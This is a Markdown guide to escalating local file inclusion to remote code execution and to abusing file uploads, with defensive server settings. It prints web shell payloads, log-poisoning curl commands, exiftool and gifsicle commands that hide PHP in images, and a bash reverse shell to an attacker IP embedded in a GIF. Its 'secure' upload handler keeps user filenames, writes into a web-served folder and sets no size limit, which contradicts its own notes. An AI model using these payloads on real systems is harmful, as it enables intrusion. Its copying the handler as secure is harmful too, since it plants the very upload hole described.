# 🔐 Local File Inclusion to Remote Code Execution - Complete Security Guide

---

## 📌 Table of Contents

1. [Local File Inclusion (LFI) to Remote Code Execution (RCE) Techniques](https://claude.ai/chat/34502f44-a445-4072-b535-5bf679949680#lfi-to-rce)
2. [File Upload Abuse](https://claude.ai/chat/34502f44-a445-4072-b535-5bf679949680#file-upload-abuse)
3. [Real-World Abuse Scenarios](https://claude.ai/chat/34502f44-a445-4072-b535-5bf679949680#real-world-scenarios)
4. [Defensive Strategy](https://claude.ai/chat/34502f44-a445-4072-b535-5bf679949680#defensive-strategy)
5. [Secure PHP Upload Handler](https://claude.ai/chat/34502f44-a445-4072-b535-5bf679949680#secure-php-handler)
6. [Server Configuration](https://claude.ai/chat/34502f44-a445-4072-b535-5bf679949680#server-configuration)
7. [Testing & Operations](https://claude.ai/chat/34502f44-a445-4072-b535-5bf679949680#testing-operations)

---

## 🎯 Local File Inclusion (LFI) to Remote Code Execution (RCE) Techniques {#lfi-to-rce}

> **Educational Purpose:** Local File Inclusion (LFI) vulnerabilities allow attackers to include files on a server, often leading to sensitive information disclosure or full Remote Code Execution (RCE) when combined with other techniques.

### Common Techniques for LFI to RCE

#### 1. 🔧 PHP Wrappers

- **PHP wrappers** like `php://filter` and `php://input` can be used to read, modify, or execute files
- Attackers use the `php://filter` wrapper to base64-encode PHP source files for information gathering
- Wrappers like `zip://` can be abused by uploading specially crafted ZIP files containing malicious code, then including them via LFI for execution

**Example:**

```php
// Reading PHP source code via LFI
?page=php://filter/convert.base64-encode/resource=config.php

// Executing code via php://input
?page=php://input
POST: <?php system($_GET['cmd']); ?>
```

---

#### 2. 💉 Null Byte Injection

- Appending a null byte (`%00`) to file names can bypass filters restricting file extensions
- For example, a filter blocking `.png` files can be bypassed by requesting `file.php%00.jpg`, thus including `file.php`
- This technique exploits how PHP treats the null byte as string termination in certain versions/situations

**Example:**

```php
// Bypassing extension filter
?page=malicious.php%00.jpg
// PHP interprets this as malicious.php
```

---

#### 3. 📤 File Upload Abuse

- When combined with an upload functionality, attackers upload files that appear legitimate (e.g., images) but contain embedded PHP payloads
- A common method is appending PHP code as a comment within an image file
- After uploading, the attacker uses the LFI vulnerability to include and execute the uploaded file

**Attack Flow:**

1. Upload image with embedded PHP payload
2. Use LFI to include the uploaded file
3. Execute malicious code

---

#### 4. 📝 Controlled Log / Log Poisoning

- Attackers inject PHP code into log files (e.g., HTTP headers like `User-Agent`)
- If logs are accessible via LFI, including the log file leads to executing attacker-controlled PHP code
- This method leverages writable logs and improper file inclusion paths

**Example:**

```bash
# Inject PHP code in User-Agent
curl -A "<?php system('whoami'); ?>" http://target.com/

# Include the log file via LFI
?page=/var/log/apache2/access.log
```

---

## 🚨 File Upload Abuse {#file-upload-abuse}

> **Scope:** This document explains how file upload abuse works, common exploitation techniques, defensive controls, safe code/config samples, testing guidance, detection & response, and quick takeaways you can copy into Slack or a poster.

### What is File Upload Abuse?

File Upload Abuse occurs when an attacker leverages an application's file upload functionality to store or execute malicious content on the server or impact other users. Risks include:

- Remote code execution (RCE)
- Stored XSS
- Phishing distribution
- Data exfiltration
- Privilege escalation
- Supply-chain contamination of user-facing content

---

### 🔄 How it Typically Works (Brief Flow)

1. **Attacker finds an upload endpoint** (public or authenticated)
2. **Attacker uploads a crafted file** that bypasses naive checks (extension, Content-Type)
3. **Server stores the file** in a web-accessible location or processes it with unsafe parsers
4. **Attacker triggers the file** (visits URL, includes it in an app flow) and achieves impact (RCE, XSS, phishing, etc.)

---

### 🛠️ Common Exploitation Techniques

#### **Double Extensions**

Adding `.php` into a filename (e.g., `avatar.jpg.php`) when only the last extension isn't validated

**Example:**

```
avatar.jpg.php  → Executes as PHP if not properly validated
```

---

#### **Null Byte Injection**

Using `%00` terminated names (rare on modern stacks but historically relevant)

**Example:**

```
malicious.php%00.jpg  → Interpreted as .php
```

---

#### **Content-Type Spoofing**

Sending `Content-Type: image/jpeg` while the body contains script

**Example:**

```http
Content-Type: image/jpeg
[PHP script content]
```

---

#### **Polyglot Files**

Files valid as both an image and scripting language (e.g., PHP in an image comment)

**Example:**

```php
GIF89a<?php system($_GET['cmd']); ?>
```

---

#### **ZIP/Archive Polyglots**

Deploy a web shell inside an archive that gets unpacked by server-side utilities

---

#### **Magic-Byte Bypass**

Crafting file contents to match a simple magic-byte check while containing payload elsewhere (Exif, comments, extra segments)

---

#### **Path Traversal in Filename**

Using `../../../` sequences in filename or metadata to write outside intended directory

**Example:**

```
../../../var/www/html/shell.php
```

---

> **Note:** Modern frameworks and runtimes have mostly mitigated classic null-byte attacks, but other bypasses remain common.

---

## 🎭 Real-World Abuse Scenarios (High Level) {#real-world-scenarios}

### 1. **Web Shell Upload**

Uploading a **web shell** into an uploads directory that the web server executes. Attackers may then pivot and extract credentials or run arbitrary commands.

---

### 2. **XSS/Phishing Pages**

Uploading HTML/SVG/JS to host phishing pages or deliver XSS to other users.

---

### 3. **Malware Distribution**

Uploading malware or hosting malicious files that users download.

---

### 4. **Denial of Service**

Storing large or malformed files to cause denial-of-service or crash parsers (e.g., zip bombs).

---

## 🛡️ Defensive Strategy — Layered Approach {#defensive-strategy}

### 1️⃣ Input Validation & Allow-Listing

- **Only accept the minimum file types** your application needs (e.g., `jpg`, `png`, `pdf`)
- **Validate on server-side** — never trust client-side checks

**Best Practice:**

```php
$allowed = array('png', 'jpg', 'gif');
```

---

### 2️⃣ Content Verification

#### **Check File Magic Bytes**

File signatures using a maintained DB (libmagic / python-magic)

```bash
file --mime-type suspicious-file.png
```

#### **For Images**

Validate actual image decoding (load with image library and confirm dimensions and expected metadata)

```php
$imagedetails = getimagesize($_FILES['file']['tmp_name']);
```

#### **For Archives**

Inspect contents; don't auto-extract untrusted archives

---

### 3️⃣ Storage Hardening

#### **Rename Files**

Randomized IDs (UUIDs or cryptographic random hex) and strip user-supplied names

```php
$newFilename = bin2hex(random_bytes(16)) . '.' . $fileExt;
```

#### **Store Outside Webroot**

Store uploads **outside** the webroot when possible. Serve files through an application proxy or signed URLs.

```bash
# Store in /var/www/uploads (outside webroot)
mkdir -p /var/www/uploads
```

#### **Ensure No Script Execution**

Ensure uploaded-directory has **no script execution** enabled

---

### 4️⃣ Server & Webserver Config

#### **Return 403 for Script Files**

Configure your webserver to return 403 for script files in upload directories

**Nginx Example:**

```nginx
location /uploads/ {
    alias /var/www/uploads/;
    internal;
    autoindex off;
    try_files $uri =404;
}
```

**Apache Example:**

```apache
<FilesMatch "\.(php|phtml|php5|pl|py|jsp|asp)$">
    Require all denied
</FilesMatch>
```

#### **Correct MIME/Handler Mappings**

Avoid interpreting uploaded files by ensuring MIME/handler mappings conservatively

---

### 5️⃣ Scanning & Sandboxing

- **Scan with antivirus** (ClamAV, VirusTotal API) before making files accessible
- **Sandbox execution** for advanced analysis
- **Use background jobs** or object-created hooks (S3 Lambda) for async scanning

---

## 🐘 Secure PHP Upload Handler (save this as `file-upload.php` in webroot) {#secure-php-handler}

> **Note:** This script stores files outside the webroot (`/var/www/uploads`) and returns a signed (or application-proxied) access URL. Adjust `MAX_FILE_SIZE` and `$ALLOWED_EXT` to your needs.

```php
<?php

// Check if the upload form was submitted
if (isset($_POST['upload'])) {

    // Allowed file extensions
    $allowed = array('png', 'jpg', 'gif');

    // Allowed MIME types
    $allowed_mime = array('image/png', 'image/jpeg', 'image/gif');

    // Detect the MIME type of the uploaded file
    $fileMime = mime_content_type($_FILES['file']['tmp_name']);

    // Get the file extension of the uploaded file
    $filename = explode(".", $_FILES['file']['name']);
    $fileExt = end($filename);

    // Split filename to extract extension
    $splitFilename = explode(".", $_FILES['file']['name']);
    $fileExtension = end($splitFilename);

    // Detect image details (returns false if not an image)
    $imagedetails = getimagesize($_FILES['file']['tmp_name']);

    // Get the file extension (last part after the dot)
    $fileExtension = end($splitFilename);

    // Check for any file upload error
    if ($_FILES['file']['error']) {
        echo "Please upload a PNG / JPG / GIF";
        die(); // Stop script execution
    } else {

        // Validation:
        // 1. Extension must be in $allowed
        // 2. getimagesize() must confirm it's an image
        // 3. MIME type must be in $allowed_mime
        if (in_array($fileExtension, $allowed) && ($imagedetails == true) && in_array($fileMime, $allowed_mime)) {

            // Print file details
            echo "Name: " . $_FILES["file"]["name"] . "<br />";
            echo "Size: " . $_FILES["file"]["size"] . "<br />";
            echo "Temp File: " . $_FILES["file"]["tmp_name"] . "<br />";

            // Move file to the "upload" directory
            move_uploaded_file($_FILES["file"]["tmp_name"], "upload/" . $_FILES["file"]["name"]);

            echo "File Uploaded Successfully";

        } else {
            // If file doesn't meet the whitelist rules
            echo "<br />Please upload a PNG / JPG / GIF";
        }
    }
}

?>

<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>File Upload - Whitelist</title>
</head>
<body>
```

---

## ⚙️ Server Configuration {#server-configuration}

### 🐧 Linux Commands — Create Upload Area & Permissions

**Recommended:** Store uploads **outside** the webroot, e.g. `/var/www/uploads` or `/srv/uploads`. If you must use a webroot subdirectory, still disable script execution there.

#### Create the Upload Directory (Outside Webroot)

```bash
mkdir -p /var/www/html/web-pentest/uploads
```

#### Set Ownership to Webserver User

```bash
chown www-data:www-data /var/www/html/web-pentest/uploads
```

#### Restrict Permissions

```bash
chmod 755 /var/www/html/web-pentest/uploads
```

---

### 🌐 Webserver: Disable Script Execution in Upload Directory

#### **Nginx (Recommended: Serve via Application or Signed URLs)**

Place this in your server config (not the `location` that executes PHP):

```nginx
# ensure uploaded files cannot be interpreted as scripts
location /uploads/ {
    alias /var/www/uploads/;
    internal;           # optional: force serving through backend if used
    autoindex off;
    try_files $uri =404;
}
```

If you use `internal` in `location /uploads/`, you must provide an application endpoint that reads the file and returns it (signed URLs recommended).

---

#### **Apache (Example `.htaccess` or Site Config)**

Create an `.htaccess` in the upload folder (if `AllowOverride` enabled) or add to the site config:

```apache
# disable script handling
<FilesMatch "\.(php|phtml|php5|pl|py|jsp|asp)$">
    Require all denied
</FilesMatch>

# avoid content sniffing and force download if needed
Header set X-Content-Type-Options "nosniff"
```

---

## ✅ Testing & Safe Operational Checklist {#testing-operations}

### **Test Only on Staging Environments You Control**

Do not upload malware to production.

### **Verify:**

- **Upload directory is not executable**
    
    ```bash
    find /var/www/uploads -type f -exec file {} \; optionally
    ```
    
- **Webserver does not process `.php`, `.phtml`, etc.** Test by uploading a benign PHP file and confirming it doesn't execute
    
- **Filenames cannot be manipulated** Already randomized in secure handler
    

---

### **Monitor Logs For:**

- **Uploads with mismatched `Content-Type` vs `finfo`**
- **Repeated small upload/download files**
- **Attempted requests for `.php`, `.phtml` or other blocked extensions in upload path**

---

## 🔒 Notes on the Script

- **Files are stored outside the webroot** (`/var/www/html/web-pentest/uploads`) — prevents direct execution
- **Filename is randomized** to avoid user-controlled names and path traversal
- **Uses `finfo` (libmagic) and `getimagesize()`** to verify content
- **Enforces maximum file size; sets secure file permissions**
- **Recommends scanning (AV) and recording upload metadata** (user, IP, sha256) in a DB

---

## 🔍 Optional: Quick AV Scan with ClamAV (Example)

### Scan a Recently Uploaded File

```bash
clamscan --no-summary /var/www/html/web-pentest/uploads/<file>
```

### For Better Performance (with clamd daemon)

```bash
clamdscan /var/www/uploads/<file>
```

> Integrate scanning via background job or object-created hook (S3 Lambda).

---

## 🛡️ Serving Uploaded Files Securely

### **Preferred:**

Serve through an application endpoint that verifies authorization and returns file bytes. That endpoint should read from `/var/www/uploads/<file>` and set correct headers (`Content-Type`, `Content-Disposition`) and the `X-Content-Type-Options: nosniff` header.

### **Alternate:**

Use temporary pre-signed URLs (S3) — objects should remain private until scanned and validated.

### Example Response Header Suggestions:

```http
Content-Type: image/jpeg
Content-Disposition: inline; filename="image.jpg"
X-Content-Type-Options: nosniff
Cache-Control: private, max-age=3600
```

---

## 📊 File Upload Abuse — Threat Summary, Detection & Mitigation

> **⚠️ Warning:** The techniques summarized below are offensive in nature (embedding executable code in image files to bypass naive upload filters). This document **does not** provide instructions to create exploits. It focuses on how defenders can detect, remove, and prevent such abuse.

Attackers sometimes hide executable code inside image files (metadata, comments, or concatenated payloads) to bypass extension checks and achieve remote code execution when a vulnerable server interprets the file as code. Common goals include running commands, dumping server info, or planting backdoors.

---

## 🎯 Threat Techniques (High-Level)

### **Disguised Filenames**

Adding `.php` into a filename (e.g., `image.php.png`) to trick naive extension checks

### **Embedded Metadata Payloads**

Placing scripting code inside EXIF/XMP/comment fields of images

### **Comment-Embedded Payloads**

Using image-comment features (GIF comments, PNG text chunks) to hide code

### **Polyglots / Concatenation**

Joining a valid image with a script so initial bytes look like an image while later bytes contain code

### **Magic-Byte / Header-Only Checks**

Bypassing checks that only inspect the file header without decoding the full content

---

## 🔧 Defensive Detection (Commands & Checks)

Use these defensive commands to inspect files you control or to include in an ingestion pipeline. **Run only on systems and files you are authorized to analyze.**

### Inspect Metadata and Comments

```bash
# Install exiftool
apt install exiftool

# Show EXIF/XMP metadata (defensive)
exiftool suspicious-file.png
```

---

### Search for Embedded PHP or Other Script Markers

```bash
# Show printable strings and search for PHP markers (defensive)
strings suspicious-file.png | grep -i '<?php' -n || true
```

---

### Inject PHP Code into Image Comment with exiftool

**⚠️ OFFENSIVE EXAMPLE (for education only):**

```bash
exiftool -Comment='<?php echo "<pre>"; system($_GET['cmd']); ?>' w.php.png
```

---

### Install and Use gifsicleest

```bash
apt install gifsicle
```

---

### Search for Embedded PHP in Files

```bash
# Show printable strings and search for PHP markers (defensive)
strings Sample-GIF.gif | grep -i '<?php' -n || true
```

---

### Inject PHP into GIF Comment with gifsicle

**⚠️ OFFENSIVE EXAMPLE (for education only):**

```bash
gifsicle < 1.gif --comment "<?php phpinfo(); ?>" > phpinfo.gif
```

---

### Check MIME Type Using libmagic

```bash
# Determine detected MIME type
file --mime-type Sample-GIF.gif

# Or (more reliable)
python -m mimetypes Sample-GIF.gif
```

---

### Inspect Image Internals with ImageMagick (Defensive)

```bash
identify -verbose suspicious-file.png | less
```

---

### Find Suspicious Filenames on Disk (Defensive)

```bash
# Files containing "php" in the name under uploads
find /var/www/uploads -type f -iname '*php*' -print
```

---

### Scan Newly Uploaded Files with AV (Defensive)

```bash
clamscan --no-summary /var/www/uploads/newfile

# Or use clamdscan for daemonized scanning
clamdscan /var/www/uploads/newfile
```

---

## 🧹 Removal / Neutralization (Safe Commands)

If you find files that contain suspicious metadata/comments, remove metadata and re-encode images to strip hidden fields. **These commands do not add payloads; they remove metadata and re-encode images.**

### Remove All Metadata with exiftool

```bash
# Remove all metadata with exiftool (creates a backup by default)
exiftool -all= suspicious-file.png
```

---

## 🔄 Embedding a PHP Reverse Shell Payload in GIF Comment

> **Educational Purpose Only** - This demonstrates how attackers embed payloads

Suppose the PHP reverse shell payload is saved in a file named `php-reverse-shell.php`. You can embed this entire payload as the GIF comment by passing it inline or reading it from the file.

### Updated Command:

If you want to embed an inline PHP reverse shell payload directly (example payload):

```bash
gifsicle < Sample-GIF.gif --comment "<?php exec('/bin/bash -c \'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1\''); ?>" > rshell.gif
```

Replace `ATTACKER_IP` and `PORT` with your attacker's IP and desired listening port.

### Example Command Used:

```bash
gifsicle < Sample-GIF.gif --comment "<?php exec('/bin/bash -c \'bash -i >& /dev/tcp/192.168.1.7/0 0>&1\''); ?>" > rshell.gif
```

---

### Or Embed from a Separate File (More Practical):

```bash
gifsicle < 1.gif --comment "$(cat php-reverse-shell.php)" > rshell.gif
```

This reads the entire content of your `php-reverse-shell.php` and injects it as the GIF comment.

---

## 📌 Notes:

- The reverse shell PHP code typically looks like this minimal example:

```php
<?php
exec("/bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1'");
?>
```

- The uploaded GIF will still be a valid image but includes the PHP code in the comment, which may execute if the file is included via LFI or accessed as a PHP script on the server.

---

## 📝 Quick Slack-Ready Summary (Copy/Paste)

> **Secure Uploads — Checklist:** Store uploads outside webroot, allow-list extensions, validate magic bytes with `finfo`, verify via `getimagesize()` for images, randomize filenames, set tight perms, disable script execution in upload directory, scan with AV, and serve files via app-proxy or signed URLs.

---

## 🎯 Key Takeaways

✅ **Store files outside webroot** to prevent direct access  
✅ **Validate file types** using magic bytes (libmagic/finfo) and `getimagesize()` for images  
✅ **Randomize filenames** to prevent path traversal attacks  
✅ **Set restrictive permissions** (755 for directories, 644 for files)  
✅ **Disable script execution** in upload directories via web server configuration  
✅ **Scan files with antivirus** (ClamAV recommended)  
✅ **Serve files securely** through application endpoints with proper headers or pre-signed URLs  
✅ **Monitor logs** for suspicious upload patterns  
✅ **Never trust client-side validation** — always validate server-side

---

_Last Updated: January 6, 2026_  
_Document Version: 2.0_